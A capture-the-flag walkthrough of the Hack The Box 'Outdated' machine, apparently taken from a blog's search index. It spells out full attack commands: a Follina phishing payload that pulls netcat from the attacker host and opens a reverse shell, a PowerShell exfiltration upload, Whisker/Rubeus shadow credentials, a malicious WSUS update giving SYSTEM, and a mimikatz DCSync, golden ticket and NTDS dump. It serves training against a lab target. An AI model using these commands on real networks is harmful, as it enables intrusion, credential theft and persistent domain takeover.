zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 08:49 BST Nmap scan report for 10.129.229.239 Host is up (0.040s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 25/tcp open smtp hMailServer smtpd | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-10 15:52:26Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-12-13T00:17:36 |_Not valid after: 2024-12-12T00:17:36 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-12-13T00:17:36 |_Not valid after: 2024-12-12T00:17:36 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-12-13T00:17:36 |_Not valid after: 2024-12-12T00:17:36 |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 8530/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title. 8531/tcp open unknown 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49692/tcp open msrpc Microsoft Windows RPC 49924/tcp open msrpc Microsoft Windows RPC 49950/tcp open msrpc Microsoft Windows RPC 49984/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-10T15:53:22 |_ start_date: N/A |_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 248.40 seconds Findings:\n8530 \u0026amp; 8531 We can see that mail.outdated.htb is used: Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows I will add that to my /etc/hosts LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:50:47 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.229.239 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=outdated,DC=htb CN=Configuration,DC=outdated,DC=htb CN=Schema,CN=Configuration,DC=outdated,DC=htb DC=DomainDnsZones,DC=outdated,DC=htb DC=ForestDnsZones,DC=outdated,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=outdated,DC=htb ldapServiceName: outdated.htb:dc$@OUTDATED.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=outdated,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain As we can see there are some interesting entries here: mail.outdated.htb (which was in our NMAP scan) client.outdated.htb wsus.outdated.htb I add all of these to my /etc/hosts Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt I get 1 valid username I add this to my list of users: sflowers@outdated.htb SMTP 25: Connecting to the SMTP service using telnet: telnet mail.outdated.htb 25 I run EHLO all \u0026amp; help to enumerate the service: As we can see we do have the option AUTH LOGIN, so this may be useful for later if we need to send anything. +Note+: Remember you can only send mail via SMTP on the CLI not read. We need IMAP or POP3 to read. SMTP Commands (via Telnet): HELO / EHLO: Identifies your client to the server (use EHLO for extended features). MAIL: Specifies the sender\u0026rsquo;s email address. RCPT: Specifies the recipient\u0026rsquo;s email address. DATA: Starts the email body input. QUIT: Ends the session. NOOP: No operation (used to keep the connection alive). VRFY: Verifies if a mailbox exists (not always allowed for privacy reasons). RSET: Resets the current session without quitting. I do some user enumeration using smtp-user-enum : First with the VRFY Method:\nsmtp-user-enum -M VRFY -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box No hits using the VRFY method. I try again using the EXPN method but nothing either:\nsmtp-user-enum -M EXPN -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box Attempting to bruteforce SMTP: Using Hydra to bruteforce SMTP: hydra -l itsupport -P +/Wordlists/rockyou.txt $box smtp -t 1 I try hydra however no matter how many threads I set it always disables due to too many connections. I try the SMTP NMAP bruteforcing .nse script: nmap -p 25 --script smtp-brute $box SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares So I can see we have access to the Shares share as well as $IPC We can also see that there are multiple mentions of wsus as seen in our DNSenum findings. Attempting to use the sflowers username as password: I try and connect with the sflowers *user and use their username as password as well as a blank password but no luck: Logging into the Shares to find a PDF: I login to the SMB share using the guest account \u0026amp; immediatley find a pdf:\nsmbclient -U $domain\\$guest \\\\\\\\$box\\\\Shares I download the pdf:\nAttempting to extract creator names from the .PDF: If you are not aware, it is sometimes possible to extract valid domain usernames from pdf's if they have been created on a Windows host. As often the Creator Field is populated using the Windows User\u0026rsquo;s Logged-In Name\nSome reasons why the Creator Field Uses the Windows User\u0026rsquo;s Logged-In Name: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Attempting to extract Usernames From the PDF using exiftool: exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt I run it and check the output of the file, however there are no valid usernames, just that it was created using Word: Command Breakdown:\nexiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it’s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt Reading NOC_Reminder.pdf and discovering exploits that the environment is susceptible to: Looking at the PDF it provides a list of vulnerabilities in the environment that they need to patch as well as corresponding CVE\u0026rsquo;s. It also reveals another email address: itsupport@outdated.htb is expecting to be sent links to internal web applications to them. Investigating the CVE list For an attack path: I will use these CVE\u0026rsquo;s as a starting point to see if we can find an easy way in. CVE-2022-30138 PrintSpooler Privilege Escalation: Good privesc path once we have access as this needs to be performed locally. CVE-2022-30129 Remote Code Execution vulnerability in Visual Studio Code: This CVE-2022-30129 pertains to a Remote Code Execution vulnerability in Visual Studio Code, affecting versions less than 1.67.1. CVE-2022-29110 Microsoft Excel Remote Code Execution Vulnerability: Microsoft CVE-2022-29110: Microsoft Excel Remote Code Execution Vulnerability CVE-2022-29130 Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability.: Microsoft Windows: CVE-2022-29130: Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability. CVE-2022-30190 Follina Exploit: This is the follina exploit, it is a microsoft word exploit. There is a great writeup here by HTB. https://www.hackthebox.com/blog/cve-2022-30190-follina-explained John Hammond also has a great video here {{\u0026lt; youtube dGCOhORNKRk \u0026gt;}} 2. Foothold: Quick overview on Follina Exploit: We craft a malicious Office documents that uses a feature to load remote HTML via a link. This triggers Microsoft Support Diagnostic Tool MSDT (overview below), allowing us to execute arbitrary code on the victim\u0026rsquo;s machine without the need for macros. +This is the crazy part+ All that needs to happen for exploitation is that the user opens or +previews+ (if .rtf is used) the office document. Attack Path This may be valid attack path as we know that itsupport is expecting to be sent links. Microsoft Support Diagnostic Tool (MSDT) Overview: Purpose:\nMSDT is a built-in Windows tool designed to help users troubleshoot and diagnose system problems. It collects diagnostic information (logs, configurations, etc.) about a system and sends it to Microsoft Support or can be used to automatically resolve issues based on predefined fixes. Functionality:\nIt works through various troubleshooting packs, which are scripts or tools that identify and resolve specific issues (e.g., network connectivity, hardware problems). Often accessed via Windows troubleshooting settings or invoked by support agents when collecting system data remotely. How it’s triggered:\nCan be invoked manually by users or automatically through specific command-line arguments. In the case of the Follina exploit, it was invoked through a URL protocol (e.g., ms-msdt:) embedded in a malicious Office document. Testing if we can make itsupport click an emailed link using swaks: I use swaks to send an email to the itsupport@outdated.htb:\nswaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body \u0026quot;http://10.10.14.43/\u0026quot; --header \u0026quot;Subject: Testing\u0026quot; I put the IP of my attack box as a link within the body and setup a listener on host. nc -nvlp 80 I do this as I want to see if we send a link will it be clicked. I get a connection back to my listener once the email is sent:\nThis verified that if a link is sent to that email address the link will be clicked. Trying to get a reverse shell using the Follina exploit: This section includes all my troubleshooting when I couldn\u0026rsquo;t get things started/moving forward. I want to leave this in as a lot of walkthroughs\u0026rsquo; are like, so I did A, B, C and that\u0026rsquo;s how I got root. Where as it\u0026rsquo;s never that simple, for me at least, and leads to unrealistic expectations for people just trying to get into the industry/CTF\u0026rsquo;s. So I leave almost everything in, bones and all. Trying to get a reverse shell using Follina and a malicious .doc: I download john-hammonds follina POC:\nhttps://github.com/JohnHammond/msdt-follina?tab=readme-ov-file Create a base64 encoded reverse shell using https://revshells.com :\nRun the exploit generator \u0026amp; passing in my base64 encoded string:\npython3 follina.py -i tun0 -p 9999 -c \u0026quot;powershell -e \u0026lt;base64EncodedString\u0026gt;\u0026quot; The exploit by default starts the listener too to serve the malicious .html:\nI start my listener on 443:\nnc -nvlp 443 I use swaks to send the malicious document:\nswaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body \u0026quot;http://10.10.14.43/\u0026quot; --header \u0026quot;Subject: Testing\u0026quot; --attach follina.doc And I get…..nothing:\nLets get thinking….. Trying to get a reverse shell using Follina malicious html: With the Follina exploit the .doc/.rtf is just a mechanism to have the victim reach out to the malicious html which actually has the payload. As we know that if we send a link to the itsupport it will be clicked. Which means we should be able to send them a direct link to the malicious follina html, it be clicked and the payload delivered. Using John Hammond\u0026rsquo;s Follina exploit web-server to serve the payload: I double check that the html is working by running curl:\ncurl http://10.10.14.43:9999 We can see it is here so we know it is running: If you\u0026rsquo;re wondering why it\u0026rsquo;s so much data, the exploit requires 4096 bytes of padding to be included before the exploit will trigger. Checking the server we can see the request:\nI put the nc64.exe in the same folder and modify my command:\npython3 follina.py -i tun0 -p 9999 -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\\Windows\\Temp\\nc64.exe; C:\\Windows\\Temp\\nc64.exe -e cmd.exe 10.10.14.43 443 What\u0026rsquo;s strange is I can get it trigger the part where it reaches out to the webserver, but it never actually pulls down the nc64.exe binary however, it just reaches out to the server. Back to the drawing board…. I mean I could debug this but there are other publicly available exploits so will try one of them first. Getting a Reverse shell using Follina.py: I find this exploit:\nhttps://github.com/chvancooten/follina.py I copy the nc64.exe binary to it\u0026rsquo;s root web folder /www:\nStart the webserver \u0026amp; put my command I want to run when the victim reaches the malicious html:\npython follina.py -t rtf -m command -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\\\\Windows\\\\Temp\\\\nc64.exe; C:\\\\Windows\\\\Temp\\\\nc64.exe -e cmd.exe 10.10.14.43 443' +Note+: With this particular exploit the author does to use double backslashes to escape them. Send my email via swaks:\nswaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body \u0026quot;Here is the web app - http://10.10.14.43/exploit.html\u0026quot; --header \u0026quot;Subject: Web\u0026quot; We immediately get a hit on the web server:\nWe catch our shell Caught:\nEnumerating as the user btables: Checking if PrintSpoofer is a viable exploit path: As we saw that PrintSpooler/PrintSpoofer was mentioned the first thing to check is the privileges of our user:\nTo perform this attack we need either SeAssignPrimaryTokenPrivilege or SeImpersonatePrivilege we have neither. Maybe we can activate them with EnableAllTokePrivs.ps1 I transer EnableAllTokePrivs.ps1 :\npowershell -c wget http://10.10.14.43:9000/EnableAllTokenPrivs.ps1 -o tp.ps1 I run it:\nNo luck: Finding a check_mail.ps1 script containing clear text creds: I discover a script called check_mail.ps1 in the users home folder::\nReading the contents of the script reveals a new username and a clear-text password:\nI add the username and password to my list: I check if the username \u0026amp; password can be used to access SMB or LDAP but they cannot:\nReading Emails using check_mail.ps1: I run the check_mail.ps1 script: powershell -c .\\.check_mail.ps1 I have a feeling this is just the automated mechanism to read the email we sent. Trying to Extract Credentials using LaZagne.exe : I transer LaZagne.exe over to hunt for passwords: curl http://10.10.14.43:9000/LaZagne.exe -o lz.exe I get a big fat nothing: Using SharpHound.exe to enumerate the environment. I transfer the binary accross:\npowershell -c wget http://10.10.14.43:9000/SharpHound.exe -o sh.exe I run the collector:\n.\\sh.exe Transferring the SharpHound Zip back to myself using my custom python webserver: Start my custom python webserver:\nI have this handy python webserver that is useful when exfiling data. You can find it here: https://github.com/bloodstiller/bloodserver Save as bloodserver.py Run python3 bloodserver.py -u bloodstiller --password bl00dst1ll3r -p 9999 --https +NOTE+: Will output file as uploaded_file FYI my server has certs and you can enter in passwords \u0026amp; usernames or it will auto-generate one for you. The only reason I am not using 443 for https is because my revers-shell is running over that. Send the file from victim using powershell:\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; $wc.Headers.Add(\u0026#34;Authorization\u0026#34;, \u0026#34;Basic \u0026#34; + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\u0026#34;bloodstiller:bl00dst1ll3r\u0026#34;))); try { $response = $wc.UploadData(\u0026#34;https://10.10.14.43:9999\u0026#34;, [System.IO.File]::ReadAllBytes(\u0026#34;C:\\Users\\btables\\20241011102426_BloodHound.zip\u0026#34;)); Write-Host \u0026#34;Server response: $([System.Text.Encoding]::UTF8.GetString($response))\u0026#34;; Write-Host \u0026#34;File sent successfully!\u0026#34; } catch { Write-Host \u0026#34;An error occurred: $_\u0026#34; } File received on our attack host: +Note+: The file will be called uploaded_file you will have to change it back to a zip file. 3. Lateral Movement: Discovering btables has AddKeyCredentialLink privilege over sflowers: After ingesting the data into bloodhound we can see that btables has the AddKeyCredentialLink privilege over sflowers.\nWe can perform a shadow credentials attack to take advantage of this privilege:\nIf you are unfamiliar with this attack vector I have a write up here: https://bloodstiller.com/articles/shadowcredentialsattack/ To put it simply: If we have the WriteProperty privilege (specifically for the msDS-KeyCredentialLink attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed. Building whisker.exe: I actually don\u0026rsquo;t the binary in my folder of binaries so will have to build: I open up my windows VM. Clone the repo. git clone https://github.com/eladshamir/Whisker Open up Visual Studio 2022 Build \u0026amp; voila a nice new whisker.exe binary. Adding Shadow Credentials to sflowers using whisker.exe : I transfer whisker.exe to the host:\ncurl http://10.10.14.43:9000/Whisker.exe -o w.exe I call it w.exe for no reason other than speed when typing. I set the shadow credentials on the user sflowers:\nw.exe add /target:sflowers /domain:outdated.htb +Note+: What is great about whisker is that spits out the exact command you will need to run in rubeus. I use the base64 encoded certificate to request a TGT for sflowers using rubeus: I run rubeus and pass it the base64 encoded certificate \u0026amp; password:\nr.exe asktgt /user:sflowers /certificate:\u0026lt;base64Cert\u0026gt; /password:\u0026quot;sA1JSl1rVtabQdMp\u0026quot; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show Rubeus Command Explained:\nUses the certificate to request a Kerberos TGT for Susan Flowers (sflowers) The /certificate parameter contains the Base64-encoded certificate The /password is for the private key, not Susan\u0026rsquo;s actual AD password The /getcredentials flag attempts to decrypt the encrypted NTLM hash from the TGT The /show flag displays the ticket details and other information If successful, Rubeus receives a TGT and can extract the NTLM hash As a result of this process:\nRubeus obtains a TGT for Susan Flowers (sflowers) \u0026amp; generates a .kirbi file which can be used for pass-the-ticket attacks. It also extracts and displays the user\u0026rsquo;s NTLM hash (due to the /getcredentials flag) The ticket details and other information are shown in the output (due to the /show flag) I check the NTLM hash is valid using netexec:\nnetexec smb $box -u $user -H $hash --share We can see we have read \u0026amp; write access to the WSUS shares now. +Note+: I actually had to restart the box as I was getting some strange errors when trying to authenticate to SMB as sflowers Enumerating the Host as slfowers: I connect with evil-winrm:\nevil-winrm -i $box -u $user -H $hash Get the flag:\nI see that PsExec64.exe binary is also on the desktop:\nSeeing sflowers has outbound object control over the CA: I see in bloodhound that sflowers has outbound object control over the CA:\nI run certipy-ad to see if there are any vulnerable certs:\ncertipy-ad find -vulnerable -enabled -u $user@$domain -hashes :$hash -dc-ip $box I check but there are no vulnerable certs Discovering sflowers is part of the wsus administrators group: Looking at sflowers group memberships we can see she is part of the wsus administrators group: This could be a viable attack path as if we can push a malicious update via wsus we may be able to escalate our privileges: What is WSUS (Windows Server Update Services)? WSUS (Windows Server Update Services) is a critical component in many corporate Windows environments. It allows administrators to manage and distribute updates centrally. WSUS Architecture: Typical deployment:\nOne WSUS server in the corporate network Downloads patches from Microsoft via HTTP/HTTPS Deploys patches to clients as they check in Client communication: HTTP (port 8530) HTTPS (port 8531) More complex deployments may involve:\nUpstream server: Connects to Microsoft, downloads updates Downstream servers: Receive updates from upstream, distribute to clients 4. Privilege Escalation: Manually Enumerating the WSUS Service by querying the registry: Enumerating the Primary WSUS Settings: To query the main WSUS settings, use the following command: reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate SetActiveHours REG_DWORD 0x1 ActiveHoursStart REG_DWORD 0x0 ActiveHoursEnd REG_DWORD 0x17 AcceptTrustedPublisherCerts REG_DWORD 0x1 ExcludeWUDriversInQualityUpdate REG_DWORD 0x1 DoNotConnectToWindowsUpdateInternetLocations REG_DWORD 0x1 WUServer REG_SZ http://wsus.outdated.htb:8530 WUStatusServer REG_SZ http://wsus.outdated.htb:8530 UpdateServiceUrlAlternate REG_SZ Key Findings: SetActiveHours:\nActiveHoursStart Start = 0x0 (12:00 AM) ActiveHoursEnd End = 0x17 (11:00 PM) Updates are allowed to install at any time AcceptTrustedPublisherCerts = 1\nThe system accepts certificates from trusted publishers for updates DoNotConnectToWindowsUpdateInternetLocations = 1\nThe system is configured to not connect directly to Windows Update All updates must come through the WSUS server WSUSServer:\nhttp://wsus.outdated.htb:8530 This is the central update server for the organization Connection Security: HTTP (unencrypted): The connection to the WSUS server uses HTTP instead of HTTPS Seen in the url http://wsus.outdated.htb:8530 \u0026amp; that it\u0026rsquo;s using port 8530 This could potentially expose update traffic to interception Enumerating the Automatic Update Settings: To query specific automatic update settings: reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU AutoInstallMinorUpdates REG_DWORD 0x1 NoAutoUpdate REG_DWORD 0x0 AUOptions REG_DWORD 0x3 ScheduledInstallDay REG_DWORD 0x0 ScheduledInstallTime REG_DWORD 0x3 ScheduledInstallEveryWeek REG_DWORD 0x1 UseWUServer REG_DWORD 0x1 Key Findings: AutoInstallMinorUpdates = 1\nMinor Updates: Auto-install Small updates are installed without user intervention NoAutoUpdate = 0\nAutomatic Updates: Enabled The system will automatically check for and download updates AUOptions = 3\nUpdate Installation: Automatic: Updates will be downloaded and installed automatically ScheduledInstallEveryWeek = 1\nUpdate Schedule: Day: 0 (Every day) Time: 3 (3:00 AM) Frequency: Weekly UseWUServer = 1\nUpdate Source: WSUS Server Confirms that the system is using the configured WSUS server Analysis and Implications of the results: Security Concerns: The use of an unencrypted HTTP connection to the WSUS server could pose a security risk, potentially allowing for man-in-the-middle attacks.\nE.G. Us right now. Automatic Update Behavior: The system is set to automatically install updates, which helps maintain system security but also means if we push an update it will be automatically installed!\nUpdate Control: The system is fully reliant on the WSUS server for updates, as it\u0026rsquo;s configured not to connect to Windows Update directly.\nScheduled Updates: Updates are scheduled to install weekly ScheduledInstallEveryWeek = 1, which suggests a regular maintenance window.\nAttack Path:\nI will attempt to push a malicious update using the tool SharpWSUS Using SharpWSUS to push a malicious update: Building SharpWSUS : Again I don\u0026rsquo;t have a sharpWSUS binary in my common binaries so will have to build it: I open up my windows VM. Clone the repo. git clone https://github.com/nettitude/SharpWSUS.git Open up Visual Studio 2022 Build \u0026amp; voila a nice new sharpWSUS.exe binary. Using SharpWSUS to trigger a reverse shell as system: Looking at the creators blog-post about the tool I see the following paragraph: While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL on a network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog will use PsExec.exe for code execution (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec ).\nA patch leveraging PsExec.exe can be done with the following command:\nSharpWSUS.exe create /payload:\u0026ldquo;C:\\Users\\ben\\Documents\\pk\\psexec.exe\u0026rdquo; /args:\u0026quot;-accepteula -s -d cmd.exe /c \\\u0026ldquo;net user WSUSDemo Password123! /add \u0026amp;\u0026amp; net localgroup administrators WSUSDemo /add\\\u0026rdquo;\u0026quot; /title:\u0026ldquo;WSUSDemo\u0026rdquo;\nhttps://labs.nettitude.com/blog/introducing-sharpwsus/ If you remember correctly sflowers had a PsExec64.exe binary on her desktop so this gives us a valid attack path. Creating a Malicious Update with SharpWSUS: I create my SharpWSUS payload to trigger an nc64.exe binary I have uploaded .\\SharpWSUS.exe create /payload:\u0026quot;C:\\Users\\sflowers\\Desktop\\PsExec64.exe\u0026quot; /args:\u0026quot;-accepteula -s -d C:\\Users\\sflowers\\Documents\\nc64.exe -e cmd.exe 10.10.14.43 443\u0026quot; /title:\u0026quot;EmergencyUpdate\u0026quot; +Note+: You can see at the bottom of the output it tells us the next command we need to run in order to push this malicious update. Approving our Malicious Update with SharpWSUS: Approve the update:\n.\\SharpWSUS.exe approve /updateid:bdf7d92c-2b96-42c3-b615-fc207c9d49af /computername:dc.outdated.htb /groupname:\u0026quot;EmergencyUpdate\u0026quot; +Note+: Be patient it can take a minute or longer in real life depending on update schedules etc. In real life this could take upto a week etc if updates are only pushed weekly and under certain circumstances. /groupname: = the /title: we set in the previous step e.g. \u0026quot;EmergencyUpdate\u0026quot; Remember to modify the /computername: to be the FQDN of the target you are attacking. Shell Caught:\n4. Persistence: Creating a golden ticket with mimikatz.exe: I upload mimikatz via the existin evil-winrm session with sflowers:\nI perform a dcsync attack and dump the krbtgt hash: lsadump::dcsync /user:krbtgt /domain:outdated.htb I get the SID, KRBTGT NTLM hash which is all I need to perform my Golden Ticket Attack. I create my golden ticket:\nkerberos::golden /domain:outdated.htb /user:Administrator /sid:S-1-5-21-4089647348-67660539-4016542185 /rc4:\u0026lt;redacted\u0026gt; I transfer the ticket via evil-winrm:\nConvert with impacket-ticketconverter:\nimpacket-ticketConverter ticket.kirbi admin.ccache Import into session my current session:\nexport KRB5CCNAME=./admin.ccache Syncronise my time with the Domain Controller:\nsudo ntpdate -s dc.$domain +Note+: As kerberos uses time based security checks this is important Check the ticket is in memory:\nklist If you look we can see this ticket is valid for 10 years so as long no-one changes the krbtgt password (which is unlikely) we will have persistence. Connect Using my ticket using impacket-psexec:\nimpacket-psexec dc.$domain -k Dumping NTDS for fun for fun and profit: Now that we have persistence we might as well pillage:\nI perform a DCSync attack using netexec and dump all hashes:\nnetexec smb $box -u administrator --use-kcache -M ntdsutil Lessons Learned: What did I learn? I learned about the follina exploit, I had never used that exploit previously so was interesting using purely the malicious HTML part as a delivery mechanism for our exploit. I learned a lot about WSUS. Looking at the different architecture options available and how to query the registry was interesting from an enumeration point of view. I learned about the process of doing a shadow credentials attack. I even stopped the box halfway to do a deep-dive and made a blog post I found it so interesting: https://bloodstiller.com/articles/shadowcredentialsattack/ What silly mistakes did I make? Trying to download to C:\\\\Temp\\\\ you know the FAMOUS non-existent directory in windows! I had a couple of real dense moments when I was tired \u0026amp; over-thinking about how I could use the malicious Follina html instead of just sending the link. Oh, for some reason I kept forgetting to add the title with SharpWSUS. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/outdated-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rubeus\/": {
        "title": "Rubeus",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rubeus\/"
    },
    
    "http:\/\/localhost:1313\/tags\/wsus\/": {
        "title": "WSUS",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/wsus\/"
    },
    
    "http:\/\/localhost:1313\/articles\/shadowcredentialsattack\/": {
        "title": "Understanding the Shadow Credentials Attack Vector",
        "tags": ["Windows","LDAP","msDS-KeyCredentialLink","Shadow Credentials","Active Directory","Rubeus","Whisker",],
